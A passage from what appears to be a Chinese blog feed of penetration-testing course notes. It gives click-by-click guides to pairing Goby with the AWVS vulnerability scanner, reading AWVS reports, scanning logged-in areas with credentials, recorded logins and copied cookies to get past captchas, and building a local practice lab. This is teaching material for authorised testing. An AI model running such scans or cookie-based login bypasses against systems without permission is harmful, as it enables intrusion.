src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/fa740fd2d32c46b5ad8cdd850deefa46.png" alt="image.png"></p><p>10.找到【API Key】，点击【Generate New Api Key】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/23a868079ed34c498768f5d1bfa4a755.png" alt="image.png"></p><p>11.点击【Show】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3873ed2d97d04a4a8e8b8f85150c9e5d.png" alt="image.png"></p><p>12.点击【copy】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f8ea9c32faf2473b90555bca447f6a83.png" alt="image.png"></p><p>13.切换【Goby】，粘贴【API Key】和输入【AVWS WEB ADDress】，点击【Confirm】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/8545ca84026847929bd53a6285f97edf.png" alt="image.png"></p><p>14.点击【设置】，点击【扩展设置】，点击【确认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/701dd8ccce124f31979a9b6600a5e74a.png" alt="image.png"></p><h2 id="3-安装npcap-0-9995-exe"><a href="#3-安装npcap-0-9995-exe" class="headerlink" title="3.安装npcap-0.9995.exe"></a>3.安装npcap-0.9995.exe</h2><p>1.右键点击附件里的【npcap-0.9995.exe】，选则【以管理员身份运行】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f96ab014dfcd46d4a650b11b35f8f336.png" alt="image.png"></p><p>2.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d41404e228f64985a88963772328a880.png" alt="image.png"></p><p>3.点击【I Agree】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3f7a7549f8cf4dab8d7bdd02685d2388.png" alt="image.png"></p><p>4.点击【Install】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/27389ce180dc455c9664b7ba65497d98.png" alt="image.png"></p><p>5.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/36733835588743a9a6f48f1c8995d86f.png" alt="image.png"></p><p>6.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/fa9e44c0f7ea43f580eaa960ffd22238.png" alt="image.png"></p><p>7.点击【Finish】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/7fd9171e27a24a3db7b5f7ae0dd12f1b.png" alt="image.png"></p><h2 id="4-Goby-AWVS联动扫描"><a href="#4-Goby-AWVS联动扫描" class="headerlink" title="4.Goby+AWVS联动扫描"></a>4.Goby+AWVS联动扫描</h2><p>1.点击【扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/e745ef82f410486a8c29fb843f2461df.png" alt="image.png"></p><p>2.输入ip进行扫描,点击【开始】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3fbba4b002b34c17b9cef3f28df2199c.png" alt="image.png"></p><p>3.等待扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d82b2aa35ea04f55bd3657510b9b4ee9.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/a1555b1037414aa89d64974f5de7aa2d.png" alt="image.png"></p><p>4.点击【Web检测】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/0d6585029108492b92257c9fa108cba2.png" alt="image.png"></p><p>5.点击【awvs】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/cf99391ca82e4b0db9569ca2ff4e6585.png" alt="image.png"></p><p>6.切换到【AWVS】，点击【Scans】，点击【Goby传过来的任务】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/8ce4d62b7ce141fdbf18e01a3150afe2.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/1f1055af4d6848338edfd6a5dd4b7de1.png" alt="image.png"></p><p>7.切回到【Goby】，点击【扩展程序】,点击【awvs】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f3d160eed543449cafc8a417c8d6f85d.png" alt="image.png"></p><p>8.选择报告模板，点击【Generate】,生成报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/05d00d10c2bc4de8b8d857f993d32588.png" alt="image.png"></p><p>9.点击【Export】可以导出报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/a93fcf070fa84692ae562e68e156cdb4.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-4-jie-sao-miao-bao-gao-fen-xi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-4-jie-sao-miao-bao-gao-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="第四节-扫描报告分析"><a href="#第四节-扫描报告分析" class="headerlink" title="第四节-扫描报告分析"></a>第四节-扫描报告分析</h1><h2 id="AWVS报告类型"><a href="#AWVS报告类型" class="headerlink" title="AWVS报告类型"></a>AWVS报告类型</h2><p>Standard Reports：标准报告</p><p>Affected Items：受影响项目</p><p>Comprehensive (new)：综合（新）</p><p>Developer：开发者</p><p>Executive Summary：执行摘要</p><p>Quick：快速报告</p><h2 id="Compliance-Reports：合规报告"><a href="#Compliance-Reports：合规报告" class="headerlink" title="Compliance Reports：合规报告"></a>Compliance Reports：合规报告</h2><p>CWE / SANS Top 25：SANS (SysAdmin, Audit, Network, Security) 研究所是美国一家信息安全培训与认证机构</p><p>DISA STIG：DISA STIG 是指提供技术指南（STIG — 安全技术实施指南）的组织（DISA — 国防信息系统局）</p><p>HIPAA：HIPAA标准</p><p>ISO 27001：国际标准</p><p>NIST SP 800-53：联邦信息系统标准</p><p>OWASP Top 10 2013：开放式Web应用程序安全项目 2013标准</p><p>OWASP Top 10 2017：开放式Web应用程序安全项目 2017标准</p><p>PCI DSS 3.2：即支付卡行业数据安全标准</p><p>Sarbanes Oxley：萨班斯法案标准</p><p>WASC Threat Classification：WASC 组织标准</p><h2 id="最常用的报告类型："><a href="#最常用的报告类型：" class="headerlink" title="最常用的报告类型："></a>最常用的报告类型：</h2><p>1.Executive Summary：执行摘要 给公司大领导看，只关注整体情况，不关注具体细节</p><p>2.Comprehensive (new)：综合（新）：一般给QA和产品经理看</p><p>3.Developer：开发者：给开发人员看</p><p>4.OWASP Top 10 2017 行业报告的代表</p><p>5.WASC Threat Classification 行业报告的代表</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-3-jie-awvs-sao-miao-web-ying-yong-cheng-xu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-3-jie-awvs-sao-miao-web-ying-yong-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="第三节-AWVS扫描Web应用程序"><a href="#第三节-AWVS扫描Web应用程序" class="headerlink" title="第三节-AWVS扫描Web应用程序"></a>第三节-AWVS扫描Web应用程序</h1><h2 id="1-账户密码登录扫描"><a href="#1-账户密码登录扫描" class="headerlink" title="1.账户密码登录扫描"></a>1.账户密码登录扫描</h2><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/36991ed7d4ba43f5aff2ed560749d35c.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/a92e61f1c3cf479ca7c04a8105bc617b.png" alt="image.png"></p><p>3.点击【Site Login】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc6082a28000438fb243888a3b5327f5.png" alt="image.png"></p><p>4.选择【try to auto-login into the site】,输入登录地址，用户名【xiaogang】，密码【123456】，重复密码【123456】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4f5f3ed8e050454da04304dfbf077784.png" alt="image.png"></p><p>5.点击【HTTP Authentication】的开启按钮</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ca1b8fd89df143d8a32a114a9f971fa6.png" alt="image.png"></p><p>6.输入用户名【小刚】,密码【123456】，重复密码【123456】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/02d9c182fc4a4aaf84186c293614aac5.png" alt="image.png"></p><p>7.点击【save】，然后点击【Scan】按钮</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d9df48791deb4782bf8e421cc69d64a8.png" alt="image.png"></p><p>8.选择扫描设置，如图所示，点击【create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4ebab4587a3a4abf81832bc4989c26ba.png" alt="image.png"></p><p>9.点击扫描目标，查看扫描具体内容</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/9e11ed8ed6f24a76a46002b080400de5.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5e96d1f03e154a0f822790fa2c0e68ec.png" alt="image.png"></p><p>10.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d78be9706759447580549e5988e03992.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4d217c7e40e74a27b0ef45cc199e8164.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c0a379d78ce840c8a7e53eb742c00063.png" alt="image.png"></p><h2 id="2-利用录制登录序列脚本扫描"><a href="#2-利用录制登录序列脚本扫描" class="headerlink" title="2.利用录制登录序列脚本扫描"></a>2.利用录制登录序列脚本扫描</h2><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/339ff784fc8a4afb9ff6764f19515ef6.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/776d1d5413c344f9b0971f516d601343.png" alt="image.png"></p><p>3.点击【Site Login】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/7739d66d7aac4c5da0480d475773b3e8.png" alt="image.png"></p><p>4.选择【Use pre-recorded login sequence 】,点击【New】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/994d395f718b45499787edd45a19b638.png" alt="image.png"></p><p>5.点击【登录】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c29d1e54000945b192df336e08c91347.png" alt="image.png"></p><p>6.输入用户名【xiaogang】，密码【123456】,点击【登录】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc5e9e0302c54028812dacf84cb06860.png" alt="image.png"></p><p>7.检查登录脚本流程是否完整，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e62eec33761c4c2094454c341bb51095.png" alt="image.png"></p><p>8.点击【xaiogang_vip3】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/387c0b1b3d4a4bdab0fd2ff9f7f63927.png" alt="image.png"></p><p>9.点击【Restrict requests to path】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fddbf7c1804e41548435d3528683d093.png" alt="image.png"></p><p>10.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ce0add0774944ffe9d8927a577cb2ef6.png" alt="image.png"></p><p>11.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/98c4b3e7a6dc419eb47b7c7484cd2031.png" alt="image.png"></p><p>12.点击【Finish】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/696267829a0b43fc9e85b95fca2d88f8.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dc773606b84d4711bf43c4e6dc931ce0.png" alt="image.png"></p><p>13.点击【Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/485e9f63b9b04b54b4b0d167fcce6109.png" alt="image.png"></p><p>14.选怎扫描配置，如下图所示，点击【Create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1a594edc6fd04f2aa029c8bdd8243c61.png" alt="image.png"></p><p>15.点击目标连接，查看具体扫描信息</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dbb993767f214481b9d2e73f3edd6341.png" alt="image.png"></p><p>16.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/03e6d16afaec4f48b73bfe009796c34f.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fd0c824cc75d4e0daaed7d6d3aeeeb82.png" alt="image.png"></p><h2 id="3-利用定制cookie扫描"><a href="#3-利用定制cookie扫描" class="headerlink" title="3.利用定制cookie扫描"></a>3.利用定制cookie扫描</h2><p>扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。最长用的手段就是定制cookie绕过。</p><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/773081aad11743e1afa80907ea1cee93.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/38cb04b93af647d8b728150d39621a16.png" alt="image.png"></p><p>3.点击【Advanced】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5825a551928b43219f0fc9af60192257.png" alt="image.png"></p><p>4.点击【Custom Cookies】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fcdc3b768b124c3facf16d1b48f6b501.png" alt="image.png"></p><p>5.输入被测网站网址</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/b0275ea0dd1d40a08419dcb420fd0cc3.png" alt="image.png"></p><p>6.切换到其他浏览器，获取网站的cookie值</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/152a0512b80e4849841a679a47a39523.png" alt="image.png"></p><p>7.切换会AWVS，输入cookie的值，点击【+】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/649473f702434786b796dbc2d2c288fa.png" alt="image.png"></p><p>8.点击【save】，然后点击【Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e4875f76ecdf4c018469b5a95a64c094.png" alt="image.png"></p><p>9.设置扫描选项，如下图所示，点击【Create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5ffa52bd590e42048dfb0e8158b83211.png" alt="image.png"></p><p>10.点击扫描的网站地址，查看扫描信息</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4e18d51428f741c9a5e8da8cdda0f3c0.png" alt="image.png"></p><p>11.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1e36af11e5b14c9ca46f1f4bb1fd9ca0.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/979340ee6370462da77cfb93f83b7407.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-2-jie-sao-miao-huan-jing-da-jian/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-2-jie-sao-miao-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="第二节-扫描环境搭建"><a href="#第二节-扫描环境搭建" class="headerlink" title="第二节-扫描环境搭建"></a>第二节-扫描环境搭建</h1><h2 id="1-phpstudy-pro安装"><a href="#1-phpstudy-pro安装" class="headerlink" title="1.phpstudy_pro安装"></a>1.phpstudy_pro安装</h2><p>1.右键【phpstudy_x64_8.1.1.3】，选则【以管理员身份运行】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b356aebd026a401ab1280cd88de7dbc1.png" alt="image.png"></p><p>2.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/72a8f98ad53c4f8386286be533efeb84.png" alt="image.png"></p><p>3.点击【自定义选项】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/0ec2b36d494e47aaa18b13d6ffff66bd.png" alt="image.png"></p><p>4.选择喜欢的位置安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/9aa79d49261d403b88ae8e718edd8cf8.png" alt="image.png"></p><p>5.点击【立即安装】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/53c37dd487324979b5c1bf8bbe67241a.png" alt="image.png"></p><p>6.等待安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/7abe81557a3641ee8bd5df7c023f2d46.png" alt="image.png"></p><p>7.点击【安装完成]</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4de8ebb124e148e380e1cf41d8ac17fb.png" alt="image.png"></p><p>8.点击启动【Apache】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/da5592a33fd64576b9595e61b879d6e2.png" alt="image.png"></p><p>9.点击【允许访问】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/22dfca13a18c48fc903e04d49fcf60c5.png" alt="image.png"></p><p>10.点击启动【MySQL】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/946782beb70d48b88eea87240e7634a3.png" alt="image.png"></p><p>11.点击【允许访问】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/5d0618a415824060ac2cb34d37df5f9d.png" alt="image.png"></p><p>12.按照下图确认服务启动状态</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/054b9c7efd944364af2be96892efc5d5.png" alt="image.png"></p><h2 id="2-设置扫描靶场的数据库"><a href="#2-设置扫描靶场的数据库" class="headerlink" title="2.设置扫描靶场的数据库"></a>2.设置扫描靶场的数据库</h2><p>1.点击【数据库】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/34958b63d9cb4ab591f43c4912d366c9.png" alt="image.png"></p><p>2.点击【修改root密码】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4d75a477c5004794b2d8c4dc71016167.png" alt="image.png"></p><p>3.输入新密码【123456】，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b4181c549ce84ba3ba82bb0cd2d9b373.png" alt="image.png"></p><p>4.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/6b4d5ece9ae84759ba5fc05e214618cc.png" alt="image.png"></p><p>5.点击【创建数据库】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/7604abbea2be498fba9bfbcc809bfefa.png" alt="image.png"></p><p>6.输入数据库名称【gkk】，用户名【gkk】，密码【123456】，点击【确认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a111522dd2024de88a93dd7408e3f008.png" alt="image.png"></p><p>7.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fe06b9a505c741568a5fc0749de93eaf.png" alt="image.png"></p><p>8.按照下图核对数据信息（点击密码******就可以显示成明文）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/aec1cf31b5114c7fbc5eb7429517d1b1.png" alt="image.png"></p><p>9.点击【软件管理】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a165762f120f430a9905c9a47e7b665e.png" alt="image.png"></p><p>10.点击【数据库工具（客户端）】,点击【安装】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fb3eee3d72884553910fe7e01240a387.png" alt="image.png"></p><p>11.安装成功后，点击【管理】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/62406be89b314b64ae478775b54ab678.png" alt="image.png"></p><p>12.点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ccb4bb3c02084648a66b3232ae8c2f8a.png" alt="image.png"></p><p>13.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c3439b02b9e84aed888cd1d29f6f23ec.png" alt="image.png"></p><p>14.输入用户名【root】，密码【123456】，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/475dca31e00c47d1b1407bbf83d0c714.png" alt="image.png"></p><p>15.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c30021f4fcce403694b9ddf7770c37ed.png" alt="image.png"></p><p>16.点击选中【gkk】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bf0e4a513f7f4ceb9a0afefb7c9e1fb0.png" alt="image.png"></p><p>17.点击【文件】，选则【输入】，点击【SQL文件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/670f0df400d9463e895aab34ed22cd10.png" alt="image.png"></p><p>18.选择课程附件里带的【gkk.sql】，点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/170a264dbf7647829bbb4fbe0e0ab410.png" alt="image.png"></p><p>19.导入完成后，点击【关闭】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/cae74489ba3540af8c7ea9f4ff6e6e6e.png" alt="image.png"></p><p>20.根据下图查看数据库表的配置，必须和课件一致才可以</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/722fea8aa43c4cacb4e503ab5c0d1b6b.png" alt="image.png"></p><h2 id="3-部署靶场网站"><a href="#3-部署靶场网站" class="headerlink" title="3.部署靶场网站"></a>3.部署靶场网站</h2><p>1.将课件里带的两个靶场【have_code】【no_code】复制到一个纯英文的路径下</p><p>have_code: 登录有验证码靶场</p><p>no_code:登录没有验证码靶场</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/d75060e8774b4a949f32e5bd09ccf047.png" alt="image.png"></p><p>2.打开phpstudy_pro,点击【网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4172bad9154943dc802e55c24cbf374c.png" alt="image.png"></p><p>3.点击【创建网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bf201c4497e8480c9e771171ff6bac41.png" alt="image.png"></p><p>4.输入域名【127.0.0.1】，端口改为【81】，点击【浏览】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fa04d3e4f01a4db9ba18aea6e6ee213b.png" alt="image.png"></p><p>5.选择【no_code】靶场，点击【选择文件夹】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/9c75e6911177447796da41d3ef745aa5.png" alt="image.png"></p><p>6.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/e1bd846aa81c42a7929f0ce3794b44bd.png" alt="image.png"></p><p>7.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/691acf90a32e4edfae340933792db33f.png" alt="image.png"></p><p>8.点击【创建网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/8158d81ba2c14ffa98b9dd5c67f64a98.png" alt="image.png"></p><p>9.输入域名【127.0.0.1】，端口改为【82】，点击【浏览】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ca9307144fb74a1286a00fe2adaade51.png" alt="image.png"></p><p>10.选择【have_code】，点击【选择文件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a9f6188674c141f288ae3e2bfea04051.png" alt="image.png"></p><p>11.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c05237bc4a71445ca3ba733b6cf22410.png" alt="image.png"></p><p>12.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ada2b949cdaa4bd7a0e88b89c7f4934d.png" alt="image.png"></p><p>13.点击【首页】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/cd8d650c7a1a4b60adc1a585c6e49b0b.png" alt="image.png"></p><p>14.点击【重启】，重启Apache</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/78a1d78620be4d37b535e6dff4e024f6.png" alt="image.png"></p><p>15.重启完成后，浏览器访问 127.0.0.1:81/login.php</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/58ca7dc93cd642a68b3d165a6f022327.png" alt="image.png"></p><p>16.输入用户名【xiaogang】，密码【123456】，点击登录,登录成功则环境部署完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/6e1a826bb7a94d639d71df8c37824261.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bdcf29bf83054b429584057f86b36a5e.png" alt="image.png"></p><p>17.浏览器访问 127.0.0.1:82/login.php</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/94faa4aa2240470db79a806592c16e4c.png" alt="image.png"></p><p>18.输入用户名【xiaogang】，密码【123456】，验证码，点击登录,登录成功则环境部署完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/53ac7dd9018d4eee8db144d3510bdc0b.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b15d0192e9804e9db873ab1d2467b9cf.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-1-jie-avws-an-zhuang-yu-ji-huo/"/>
